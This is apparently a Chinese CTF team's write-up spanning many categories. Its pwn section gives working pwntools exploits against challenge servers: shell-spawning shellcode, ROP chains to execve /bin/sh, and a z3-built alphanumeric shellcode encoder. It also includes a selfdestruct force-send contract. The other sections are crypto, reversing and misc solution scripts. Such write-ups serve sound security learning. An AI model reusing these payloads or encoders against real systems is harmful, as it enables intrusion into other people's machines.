# Pwn

## easyoverflow

（似乎）发送 48 个任意字节再加上 `n0t_r3@11y_f1@g` 就可以了。

## shellcode

```python
from pwn import *

context.arch='amd64'

r=remote('38.39.244.2',28088)
r.recvuntil('magic!\n')
r.send(asm(shellcraft.sh())+b'\n')
r.interactive()
```

## Easy_equation

可以直接 rop 到 `system("exec /bin/sh")` 的地址。

```python
from pwn import *

r=remote('38.39.244.2',28052)
exp=b'\0'*9+p64(0x4006d0)
r.send(exp+b'\n')
r.interactive()
```

## shellcode Revenge

本来打算用 https://github.com/rcx/shellcode_encoder，但是它生成的有 `-`，不太行。

于是考虑用 xor 代替 sub。参考了一些上面的方法，然后糊了一个生成器出来。下面代码应该只能在 rax mod 256=0 时才有效，所以多试了几次。

```python
from pwn import *
from z3 import *
import traceback

context.arch='amd64'

s='''
push 0;
pop rdx;
push 0;
pop rsi;
xor rax,0x30303030;
xor rax,0x30303031;
push rax;
pop rdi;
xor rax,0x30303030;
xor rax,0x30303031;
push 0x3b;
pop rax;
syscall;
'''

def is_ok(b):
    return (b > 0x2f and b <= 0x5a) or (b>0x60 and b<=0x7a)

def inrange(x):
	return Or(And(x>BitVecVal(0x2f,8),x<=BitVecVal(0x5a,8)),And(x>BitVecVal(0x60,8),x<=BitVecVal(0x7a,8)))

def get(i32):
	s=Solver()
	bits=32
	for difficulty in range(1,5):
		s.reset()
		x = BitVec('x', bits)
		variables = []
		for j in range(0, difficulty):
			variables.append(BitVec('a%d' % (j,), bits))
		expr = x
		for var in variables[0:]:
			expr = expr ^ var
		s.add(ForAll(x, expr == x ^ BitVecVal(i32, bits)))
		for var in variables:
			for k in range(0, bits, 8):
				s.add(inrange(Extract(k+7, k, var)))
		if str(s.check()) == 'sat':
			m = s.model()
			return list(map(int, map(str, map(m.evaluate, variables))))

t=asm(s)
s=s.replace('0x30303031',hex(0x30303030^len(t)))
t=asm(s)
t+=b'/bin/sh\0'
while len(t)%4:
	t+=b'\0'

curxor=0

base=0x8000

s=''
for i in range(0,len(t),4):
	nxt=(base+512+i)^base
	u=get(curxor^nxt)
	for j in u:
		s+='xor rax,'+str(j)+';\n'
	curxor=nxt
	s+='''
	push rax;
	pop rcx;
	movsxd rsi, DWORD PTR [rcx+0x40];
	xor DWORD PTR [rcx+0x40], esi;
	push rax;
	push rbx;
	pop rax;
	'''
	v=t[i]+t[i+1]*2**8+t[i+2]*2**16+t[i+3]*2**24
	u=get(v)
	for j in u:
		s+='xor eax,'+str(j)+';\n'
	s+='xor DWORD PTR [rcx+0x40], eax;\n'
	s+='pop rax;\n'

u=get(curxor^(base+512+0x40)^base)
for i in u:
	s+='xor rax,'+str(i)+';\n'

o=asm(s)
o=o.ljust(1024,b'P')
for i in o:
	if not is_ok(i):
		print(i)
	assert(is_ok(i))
print(o.decode())

for i in range(100):
	try:
		print('start',i)
		r=remote('38.39.244.2',28059)
		r.send(o.decode()+'\n')
		r.interactive()
	except:
		traceback.print_exc()
```

## nothing_but_everything

找一条 rop 链，调用 syscall。

```python
from pwn import *

context.arch='amd64'
r=remote('38.39.244.2',28004)

s1addr=0x6bc3a0
s1=b'/bin/sh\0'.ljust(0x14,b'\0')

s2=b'\0'*120

s2+=p64(0x449505)
s2+=p64(0)
s2+=p64(0x4100d3)
s2+=p64(0)
s2+=p64(0x4494ac)
s2+=p64(0x3b)
s2+=p64(0x400686)
s2+=p64(0x6bc3a0)
s2+=p64(0x4494fc)

r.send(s1+s2+b'\n')
r.interactive()
```

## spfa

spfa 的队列长度超出时就会给 flag。可以构造溢出的负环做到。

```python
1
0 1 1431655765
1
1 2 1431655765
1
2 0 1431655765
2
0 2
3
```

# Web

## ez_bypass

先找一组 md5 碰撞，然后 passwd 可以设成 `1234567\0`。

# Algo

## 致敬 OI

先考虑容斥，考虑算箱子数不小于 $i$ 的方案数。可以钦定若干个堆数选了 $k$ 个，然后剩下书都可以随便分，也就是原问题的方案数。而钦定选 $k$ 个这部分的方案数也可以简单 dp 得到。

现在问题就是怎么快速求出原问题的方案数。一种简单的 dp 是从 $l$ 到 $r$ 枚举 $i$，然后 $f[j]+=f[j-i]$。但是这样的复杂度是 $O(n^2)$ 的。由于上一个问题中只需要用到不超过 $n-k$ 的答案，可以发现，除了最后一组数据，$r$ 都可以忽略。而 $l$ 又特别小，所以可以由划分数倒推回去。

对于划分数，可以先计算五边形数，然后递推求出。复杂度 $O(n\sqrt{n})$。

由于写的时候没注意常数，所以下面的程序可能跑的特别久。。

```cpp
#include<bits/stdc++.h>

typedef unsigned int uint;
typedef long long ll;
typedef unsigned long long ull;
typedef double lf;
typedef long double llf;
typedef std::pair<int,int> pii;

#define xx first
#define yy second

template<typename T> inline T max(T a,T b){return a>b?a:b;}
template<typename T> inline T min(T a,T b){return a<b?a:b;}
template<typename T> inline T abs(T a){return a>0?a:-a;}
template<typename T> inline bool repr(T &a,T b){return a<b?a=b,1:0;}
template<typename T> inline bool repl(T &a,T b){return a>b?a=b,1:0;}
template<typename T> inline T gcd(T a,T b){T t;if(a<b){while(a){t=a;a=b%a;b=t;}return b;}else{while(b){t=b;b=a%b;a=t;}return a;}}
template<typename T> inline T sqr(T x){return x*x;}
#define mp(a,b) std::make_pair(a,b)
#define pb push_back
#define I __attribute__((always_inline))inline
#define mset(a,b) memset(a,b,sizeof(a))
#define mcpy(a,b) memcpy(a,b,sizeof(a))

#define fo0(i,n) for(int i=0,i##end=n;i<i##end;i++)
#define fo1(i,n) for(int i=1,i##end=n;i<=i##end;i++)
#define fo(i,a,b) for(int i=a,i##end=b;i<=i##end;i++)
#define fd0(i,n) for(int i=(n)-1;~i;i--)
#define fd1(i,n) for(int i=n;i;i--)
#define fd(i,a,b) for(int i=a,i##end=b;i>=i##end;i--)
#define foe(i,x)for(__typeof((x).end())i=(x).begin();i!=(x).end();++i)
#define fre(i,x)for(__typeof((x).rend())i=(x).rbegin();i!=(x).rend();++i)

struct Cg{I char operator()(){return getchar();}};
struct Cp{I void operator()(char x){putchar(x);}};
#define OP operator
#define RT return *this;
#define UC unsigned char
#define RX x=0;UC t=P();while((t<'0'||t>'9')&&t!='-')t=P();bool f=0;\
if(t=='-')t=P(),f=1;x=t-'0';for(t=P();t>='0'&&t<='9';t=P())x=x*10+t-'0'
#define RL if(t=='.'){lf u=0.1;for(t=P();t>='0'&&t<='9';t=P(),u*=0.1)x+=u*(t-'0');}if(f)x=-x
#define RU x=0;UC t=P();while(t<'0'||t>'9')t=P();x=t-'0';for(t=P();t>='0'&&t<='9';t=P())x=x*10+t-'0'
#define TR *this,x;return x;
I bool IS(char x){return x==10||x==13||x==' ';}template<typename T>struct Fr{T P;I Fr&OP,(int&x)
{RX;if(f)x=-x;RT}I OP int(){int x;TR}I Fr&OP,(ll &x){RX;if(f)x=-x;RT}I OP ll(){ll x;TR}I Fr&OP,(char&x)
{for(x=P();IS(x);x=P());RT}I OP char(){char x;TR}I Fr&OP,(char*x){char t=P();for(;IS(t);t=P());if(~t){for(;!IS
(t)&&~t;t=P())*x++=t;}*x++=0;RT}I Fr&OP,(lf&x){RX;RL;RT}I OP lf(){lf x;TR}I Fr&OP,(llf&x){RX;RL;RT}I OP llf()
{llf x;TR}I Fr&OP,(uint&x){RU;RT}I OP uint(){uint x;TR}I Fr&OP,(ull&x){RU;RT}I OP ull(){ull x;TR}};Fr<Cg>in;
#define WI(S) if(x){if(x<0)P('-'),x=-x;UC s[S],c=0;while(x)s[c++]=x%10+'0',x/=10;while(c--)P(s[c]);}else P('0')
#define WL if(y){lf t=0.5;for(int i=y;i--;)t*=0.1;if(x>=0)x+=t;else x-=t,P('-');*this,(ll)(abs(x));P('.');if(x<0)\
x=-x;while(y--){x*=10;x-=floor(x*0.1)*10;P(((int)x)%10+'0');}}else if(x>=0)*this,(ll)(x+0.5);else *this,(ll)(x-0.5);
#define WU(S) if(x){UC s[S],c=0;while(x)s[c++]=x%10+'0',x/=10;while(c--)P(s[c]);}else P('0')
template<typename T>struct Fw{T P;I Fw&OP,(int x){WI(10);RT}I Fw&OP()(int x){WI(10);RT}I Fw&OP,(uint x){WU(10);RT}
I Fw&OP()(uint x){WU(10);RT}I Fw&OP,(ll x){WI(19);RT}I Fw&OP()(ll x){WI(19);RT}I Fw&OP,(ull x){WU(20);RT}I Fw&OP()
(ull x){WU(20);RT}I Fw&OP,(char x){P(x);RT}I Fw&OP()(char x){P(x);RT}I Fw&OP,(const char*x){while(*x)P(*x++);RT}
I Fw&OP()(const char*x){while(*x)P(*x++);RT}I Fw&OP()(lf x,int y){WL;RT}I Fw&OP()(llf x,int y){WL;RT}};Fw<Cp>out;

const int N=77140437,M=1505;

unsigned short fo[N],f[N],g[M][M],ans[M],C[M][M];
int n,k,l,r,gm[M],h[233333];

void get(int n)
{
	int c=0,t=0;
	while(1)
	{
		t++;
		h[c++]=(3*t*t-t)/2;
		h[c++]=(3*t*t+t)/2;
		if(h[c-1]>n)break;
	}
	fo[0]=1;
	fo1(i,n)
	{
		unsigned short t=0;
		for(int j=0;h[j]<=i;j++)
		{
			t+=(j&2?-1:1)*fo[i-h[j]];
		}
		fo[i]=t;
		if(i%131072==0)out,i,'\n';
	}
}

void solve()
{
	mset(f,0);
	mset(g,0);
	mset(ans,0);
	mset(C,0);
	mset(gm,0);
	in,n,k,l,r;
	f[0]=1;
	fo1(i,n)f[i]=fo[i];
	fo1(i,l-1)
	{
		fd(j,n,i)f[j]-=f[j-i];
	}
	int m=n/k;
	assert(m<=1500);
	fo(i,0,m)
	{
		C[i][0]=1;
		fo1(j,i)C[i][j]=C[i-1][j-1]+C[i-1][j];
	}
	g[0][0]=1;
	fo(i,l,min(r,m))
	{
		fd(j,m,i)
		{
			fo(k,0,gm[j-i])g[j][k+1]+=g[j-i][k];
			repr(gm[j],gm[j-i]+1);
		}
	}
	fo1(i,m)fo1(j,gm[i])ans[j]+=g[i][j]*f[n-i*k];
	fd1(i,m)
	{
		fo1(j,i-1)
		{
			ans[j]-=ans[i]*C[i][j];
		}
	}
	unsigned short ta=0;
	fo1(i,m)ta+=ans[i]*i;
	out,char(ta>>8),char(ta&255),'\n';
}

int main()
{
	get(77140434);
	while(1)solve();
}
```

划分数实际上还可以用多项式做，复杂度可能 $O(n\log n)$ 或者 $O(n\log^2 n)$ 吧。但是找了几个代码，发现好像有除以 $i(i\le n)$ 的操作。而模数是 65536，不一定有逆元，而扩展高位得到的结果也不一定正确，所以就没试这个做法。

# Reverse

## Transform

异或+换了位置，倒回去就行。（脚本应该在 py 的窗口里打的，找不到了）

## 撸啊撸

看到 lua 的相关函数，调试找到 lua 代码，然后逆回去。（脚本应该在 py 的窗口里打的，找不到了）

## PixelShooter

用 ILSpy 打开 Assembly-CSharp.dll，在里面找到 GameOver 函数。

~~hello_world_go 忘了具体是咋做了，就不写了~~

## Hard-to-go

flag 被拿去和一串东西异或了一下，然后和另一串东西比较。

```python
a=b'}0n\xc9\xcc\x03\x93\x1e\x85ME_\xc5F\xf4\xa8\xa0>\x11\xbepu\x1d\xa3\xcd\x7f\xff\xbd\x81\x12\x00\x00'
b=b'X\x08L\xe8\xe3t\xe1~\xf6?7:\xbf#\x8e\xd6\xc5Ht\xcc\x07\x07{\xd7\xbc\x19\x8f\xc8\xe6)\x00\x00'
c=b'flag{114514191981011112222333}'
c=list(c)

for i in range(30):
	c[i]^=a[i]^b[i]
print(''.join(map(chr,c)))
```

## EasyCpp

输入的每个数先异或了 1，然后分解质因数，然后把质因数依次写出来，再把 0~9 替换成一些字母，中间用 `=` 相连。然后这个串会拿去和内置的一些串比较。可以动态调试找到内置的串，然后倒推回去。

## Virtual Tree

输入的 flag 先经过了 sub_9C1610 的操作。可以发现这个操作实际只是个异或。

然后在 sub_9C16F0 里，部分位置会 异或某个值、减去某个位置、加上某个位置。

```python
s=b'1234567812345678'
s2=bytes([0x7C,0x7E,0x74,0x64,0x7A,0x7D,0x71,0x7B,0x7B,0x77,0x7D,0x7D,0x7D,0x72,0x75,0x79])
o1=bytes([0x86,0x0A,0x7B,0x17,0x7,0x7D,0x67,0x7E,0x5,0x72,0x1,0x0,0x2,0x72,0x0C,0x7B])

key1=bytes(map(lambda x,y:x^y,s,s2))

o2=[0x17,0x63,0x77,0x3,0x52,0x2E,0x4A,0x28,0x52,0x1B,0x17,0x12,0x3A,0x0A,0x6C,0x62]

def we0(x,y):
	o2[x]=(o2[x]-(o1[x]-s2[x]))%256

def w70(x,y):
	o2[x]^=o2[y]

def wa0(x,y):
	o2[x]=(o2[y]-o2[x])%256

we0(15,2)
w70(14,15)
wa0(12,2)
w70(11,12)
wa0(10,7)
wa0(9,8)
w70(8,7)
we0(7,3)
wa0(6,1)
w70(4,5)
wa0(3,7)
we0(2,7)
w70(1,2)
we0(0,10)

print(bytes(map(lambda x,y:x^y,key1,o2)))
```

# Crypto

## 天干地支+甲子

搜索“天干地支+甲子”，搜到了 https://rollby.xin/ctf/231.html。照着解就行了。

## keyboard

九宫格键盘。

## vigenere

找了个单词表，枚举某个单词的原文，使得合法单词尽量多。

```python
s=open('words_alpha.txt').read().split()
st=[[]for i in range(21)]
wo=set(s)
for i in s:
	if len(i)<=20:
		st[len(i)].append(i)
for i in range(1,21):
	print(len(st[i]))

getdiff = lambda char: ord(char)-ord('a')
getchar = lambda num: chr(ord('a')+num)

def vigenere(src: chr, key: chr) -> chr:
    assert(src.isalpha() and key.isalpha())
    return(getchar((getdiff(src) - getdiff(key) - 1) % 26))

cipher=open('cipher.txt').read()

pos=cipher.find('nrshylwmpy')
pos2=pos-cipher[:pos].count(' ')-cipher[:pos].count('\n')

kl=6
for i in st[10]:
	for kl in range(6,10):
		k=[0]*kl
		for j in range(pos,kl+pos):
			k[(j-pos+pos2)%kl]=getchar((getdiff(cipher[j])-getdiff(i[j-pos])-1)%26)
		o=''
		cnt=0
		for j in range(len(cipher)):
			if cipher[j].isalpha():
				o+=vigenere(cipher[j],k[cnt%kl])
				cnt+=1
			else:
				o+=cipher[j]
		t=o.split()
		cnt=0
		for j in t:
			if j.strip(',.') in wo:
				cnt+=1
		if cnt>=20:
			print(i,kl,cnt)
			print(o)
```

## babyRSA

前面赋值是抄的题目输出。

```python
import sympy
from gmpy2 import gcd, invert
from random import randint
from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes
import base64

base=65537

P_p = ...
P_factor = ...
Q_1= ...
Q_2= ...
sub_Q= ...
Ciphertext = ...

from gmpy2 import *

P = [0 for i in range(17)]
P[9]=P_p
for i in range(10,17):
	P[i]=sympy.nextprime(P[i-1])
for i in range(8,-1,-1):
	P[i]=sympy.prevprime(P[i+1])
n = 1
for i in range(17):
	n *= P[i]
phi=1
for i in range(17):
	phi*=P[i]-1
p=pow(P_factor,invert(base,phi),n)

q=pow(sub_Q,Q_2,Q_1)

p=sympy.nextprime(p)
q=sympy.nextprime(q)



base = 65537
_E = base
_P = p
_Q = q
assert (gcd(_E, (_P - 1) * (_Q - 1)) == 1)
_D=invert(_E,(_P-1)*(_Q-1))
_M = pow(Ciphertext, _D, _P * _Q)
flag=('%x'%_M).decode('hex')
print(flag)
```

## Easy_RSA

已知 $\varphi(n),n$ 可以分解 $n$。前面赋值是抄的题目输出。

```python
import sympy
from gmpy2 import gcd, invert
from random import randint
from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes
import base64

P_n =  ...
P_F_n =  ...
Q_n =  ...
Q_E_D =  ...
Ciphertext =  ...

from gmpy2 import *

def fac(a,b):
	#print(a)
	#print(b)
	sum=a-b+1
	t=sum**2-a*4
	x=isqrt(t)
	assert x*x==t
	return (sum-x)//2,(sum+x)//2

px,py=fac(P_n,P_F_n)
assert px*py==P_n
Q_t=(Q_E_D//Q_n)
while (Q_E_D-1)%Q_t:
	Q_t+=1
qx,qy=fac(Q_n,(Q_E_D-1)//Q_t)
assert qx*qy==Q_n


factor2 = 2021 * px + 2020 * py
if factor2 < 0:
	factor2 = (-1) * factor2
p=sympy.nextprime(factor2)
factor2 = 2021 * qx - 2020 * qy
if factor2 < 0:
	factor2 = (-1) * factor2
q=sympy.nextprime(factor2)

base = 65537
_E = base
_P = p
_Q = q
assert (gcd(_E, (_P - 1) * (_Q - 1)) == 1)
_D=invert(_E,(_P-1)*(_Q-1))
_M = pow(Ciphertext, _D, _P * _Q)
flag=('%x'%_M).decode('hex')
print(flag)
```

## real_random

尝试各种 $p,q,c,d$ 的组合可以发现，$pq$ 给定时，生成的 random 的循环节是 $2^5pq$ 的约数。

```python
t='''1296 43808
1440 48544
1512 50912
1600 53792
1656 55648
1680 56416
1764 59168
1840 61664
1872 62752
1932 64672
2080 69536
2088 69856
2116 70688
2160 72224
2184 72928
2320 77408
2376 79328
2392 79712
2400 80032
2436 81184
2520 83936
2640 87904
2668 88736
2704 89888
2760 91744
2772 92192
3016 100064
3036 100768
3120 103456
3364 111392
3432 113632
3480 115168
3600 119072
3828 126496
3960 130784
4356 143648'''.split('\n')
f={}
for i in t:
	a,b=map(int,i.split())
	f[a]=b

def get(m,d):
	x=f[m]
	t=1
	d=2**d
	while t*x<=d:
		t+=1
	return t*x-d

from pwn import *

r=remote('38.39.244.2',28101)

def work():
	r.recvuntil('m:  ')
	m=int(r.recvuntil('\n'))
	r.recvuntil('d:  ')
	d=int(r.recvuntil('\n'))
	r.recvuntil('^_^')
	r.recvuntil('\n')
	r.send(str(get(m,d))+'\n')
	v=int(r.recvuntil('\n'))
	assert v>>8==v&255
	return v>>8

while True:
	print(chr(work()),end='')
```

# Ethereum

## SimpleReveal

在创建合约的交易中找到 Input Data，按 UTF-8 显示就能看到 flag。

## Unwanted Coin

自毁时强制转账。

```
contract attacker {
    function exploit() public payable {
        selfdestruct(0x1d65b762D52A0644CCfaAD2747D6ccb57A163e72);
    }
    fallback () external payable {
    }
}
```

# Misc

## 千层套路

先解压 1000 层。密码是爆出来的。

```python
import zipfile

def get(x):
	t=zipfile.ZipFile('tmp/'+x)
	v=t.namelist()[0]
	try:
		r=t.open(v).read()
	except:
		r=t.open(v,pwd=x[:4].encode()).read()
	open('tmp/'+v,'wb').write(r)
	return v

cur='qctl.zip'
while True:
	print(cur)
	cur=get(cur)
```

然后还原二维码。

```python
from PIL import Image

s=open('tmp/qr.txt').readlines()

im=Image.new('RGB',(200,200))

for i in range(200):
	for j in range(200):
		im.putpixel((i,j),eval(s[i*200+j]))
im.save('out.jpg')
```

## CyberPunk

日期改成 9 月 17 日。

## ezmisc

把 png 高度改大一点。

## 寻找 xxx

拨号音，打开 spek 看看频谱，然后判断每一位是什么频率。

## 不眠之夜

拼图。先用下面两个脚本把纵向的大概拼一下，然后剩的为数不多的几张图再手动拼。

```python
import os
from PIL import Image

s=[]
for i in os.listdir('ini'):
	if i[-4:]=='.jpg':
		s.append(Image.open(open('ini/'+i,'rb')))

for i in s:
	assert i.size[0]==200 and i.size[1]==100
print(len(s))

def dis(a,b):
	r=0
	for i in range(3):
		if a[i]>50 or b[i]>50:
			r+=(a[i]-b[i])**2
		else:
			r+=1000
	return r

def matchx(a,b):
	s=0
	for i in range(200):
		s+=dis(a.getpixel((i,99)),b.getpixel((i,0)))
	return s

t=[]
for i in range(len(s)):
	for j in range(len(s)):
		if i==j:continue
		t.append((matchx(s[i],s[j]),i,j))
t.sort()
rs=''
for i in t:
	rs+='%d %d %d\n'%i
open('out.txt','w').write(rs)
```

```python
import os
from PIL import Image

im=Image.open('ini/00fd5b9.jpg')

fn=[]
for i in os.listdir('ini'):
	if i[-4:]=='.jpg':
		fn.append('ini/'+i)

s=[]
for i in open('out.txt').readlines():
	v=i.split()
	if len(v)==3:
		s.append(tuple(map(int,v)))

nxt=[-1]*120
pre=[-1]*120
rem=120
for v,a,b in s:
	if nxt[a]==-1 and pre[b]==-1:
		nxt[a]=b
		pre[b]=a
		rem-=1
		if rem==10:
			break

for i in range(120):
	if pre[i]==-1:
		t=[]
		x=i
		while x!=-1:
			t.append(fn[x])
			x=nxt[x]
		print(len(t))
		imt=im.resize((200,100*len(t)))
		cnt=0
		for j in t:
			imv=Image.open(j)
			imt.paste(imv,(0,100*cnt,200,100*(cnt+1)))
			cnt+=1
		imt.save('outi/%d.png'%i)
```

## pyFlag

三个 jpg 末尾有一个 zip 文件。可以爆出密码。

根据提示，猜测第一重是 base85。找了一个 base85 encoder，然后改了一下字符表。

之后就是 hex、base32、base64 了。

```python
"""Python implementation of an Ascii85 encoding

See https://en.wikipedia.org/wiki/Ascii85
Uses classic Ascii85 Algorithm, but a custom alphabet to be used as part of a bismuth bis:// url or json string.
(no / \ " ')

Inspiration from PyZMQ, BSD Licence

Data length to encode must be a multiple of 4, padding with non significant char of #0 has to be added if needed.

"""

import sys
import struct

# Custom base alphabet
Z85CHARS = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"

Z85MAP = dict([(c, idx) for idx, c in enumerate(Z85CHARS)])

_85s = [ 85**i for i in range(5) ][::-1]

def encode(rawbytes):
	"""encode raw bytes into Z85"""
	# Accepts only byte arrays bounded to 4 bytes
	if len(rawbytes) % 4:
		raise ValueError("length must be multiple of 4, not %i" % len(rawbytes))
	
	nvalues = len(rawbytes) / 4
	
	values = struct.unpack('>%dI' % nvalues, rawbytes)
	encoded = []
	for v in values:
		for offset in _85s:
			encoded.append(Z85CHARS[(v // offset) % 85])
	
	return bytes(encoded)

def decode(z85bytes):
	"""decode Z85 bytes to raw bytes, accepts ASCII string"""
	if isinstance(z85bytes, str):
		try:
			z85bytes = z85bytes.encode('ascii')
		except UnicodeEncodeError:
			raise ValueError('string argument should contain only ASCII characters')

	if len(z85bytes) % 5:
		raise ValueError("Z85 length must be multiple of 5, not %i" % len(z85bytes))
	
	nvalues = len(z85bytes) / 5
	values = []
	for i in range(0, len(z85bytes), 5):
		value = 0
		for j, offset in enumerate(_85s):
			print(i,j,z85bytes[i+j])
			value += Z85MAP[z85bytes[i+j]] * offset
		values.append(value)
	return struct.pack('>%dI' % nvalues, *values)

print(decode(open('flag.txt').read()))
```

